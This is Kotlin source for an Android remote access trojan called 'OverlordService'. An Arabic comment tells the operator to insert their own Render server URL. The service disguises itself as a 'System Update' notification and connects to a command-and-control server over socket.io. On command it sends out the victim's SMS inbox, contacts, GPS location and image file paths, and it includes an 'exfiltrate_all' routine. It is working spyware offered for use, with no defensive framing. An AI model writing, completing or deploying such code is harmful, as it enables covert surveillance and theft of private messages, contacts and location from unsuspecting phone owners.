package com.nexus.overlord

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.net.URL

class OverlordService : Service() {
    private var socket: Socket? = null
    private val serverUrl = "https://YOUR-RENDER-URL.onrender.com" // ضع رابط Render هنا

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        connectC2()
    }

    private fun startForegroundService() {
        val channel = NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_MIN)
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        val notif = NotificationCompat.Builder(this, "sys")
            .setContentTitle("System Update")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
        startForeground(1, notif)
    }

    private fun connectC2() {
        try {
            val opts = IO.Options()
            opts.reconnection = true
            opts.transports = arrayOf("websocket")
            socket = IO.socket(serverUrl, opts)

            socket?.on(Socket.EVENT_CONNECT) {
                val info = JSONObject()
                    .put("model", Build.MODEL)
                    .put("ip", "connected")
                socket?.emit("device_info", info)
            }

            socket?.on("execute_command") { args ->
                val data = args[0] as JSONObject
                when (data.getString("command")) {
                    "get_sms" -> getSms()
                    "get_contacts" -> getContacts()
                    "get_location" -> getLocation()
                    "camera_snap" -> cameraSnap()
                    "get_files" -> getFiles()
                    "change_wallpaper" -> {
                        val payload = data.optJSONObject("payload")
                        if (payload != null) changeWallpaper(payload.getString("url"))
                    }
                    "vibrate" -> vibrate()
                    "exfiltrate_all" -> exfiltrateAll()
                }
            }
            socket?.connect()
        } catch (e: Exception) { Log.e("Overlord", "Error", e) }
    }

    private fun getSms() {
        val smsList = JSONArray()
        val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        cursor?.use {
            if (it.moveToFirst()) {
                do {
                    val address = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    smsList.put(JSONObject().put("from", address).put("body", body))
                } while (it.moveToNext())
            }
        }
        socket?.emit("client_response", JSONObject().put("command", "get_sms").put("result", smsList))
    }

    private fun getContacts() {
        val contacts = JSONArray()
        val cursor = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                contacts.put(JSONObject().put("name", name).put("phone", phone))
            }
        }
        socket?.emit("client_response", JSONObject().put("command", "get_contacts").put("result", contacts))
    }

    private fun getLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            val location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location != null) {
                val lat = location.latitude
                val lon = location.longitude
                socket?.emit("client_response", JSONObject().put("command", "get_location").put("result", "Lat: $lat, Lon: $lon"))
            } else {
                socket?.emit("client_response", JSONObject().put("command", "get_location").put("result", "Location unavailable"))
            }
        } catch (e: SecurityException) {
            socket?.emit("client_response", JSONObject().put("command", "get_location").put("result", "Permission denied"))
        }
    }

    private fun cameraSnap() {
        // في الواقع، يتطلب كود لفتح الكاميرا الخلفية والتقاط صورة وإرسالها Base64
        socket?.emit("client_response", JSONObject().put("command", "camera_snap").put("result", "Camera Triggered (Requires advanced API)"))
    }

    private fun getFiles() {
        val files = JSONArray()
        val cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val path = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                files.put(path)
            }
        }
        socket?.emit("client_response", JSONObject().put("command", "get_files").put("result", files))
    }

    private fun changeWallpaper(url: String) {
        Thread {
            try {
                val input: InputStream = URL(url).openStream()
                val bitmap = BitmapFactory.decodeStream(input)
                val wm = WallpaperManager.getInstance(applicationContext)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) wm.setBitmap(bitmap, null, true, WallpaperManager.FLAG_SYSTEM or WallpaperManager.FLAG_LOCK)
                else wm.setBitmap(bitmap)
                socket?.emit("client_response", JSONObject().put("command", "change_wallpaper").put("result", "Success"))
            } catch (e: Exception) { Log.e("Overlord", "Wallpaper", e) }
        }.start()
    }

    private fun vibrate() {
        val v = getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
        else v.vibrate(1000)
    }

    private fun exfiltrateAll() {
        getSms()
        getContacts()
        getFiles()
        getLocation()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
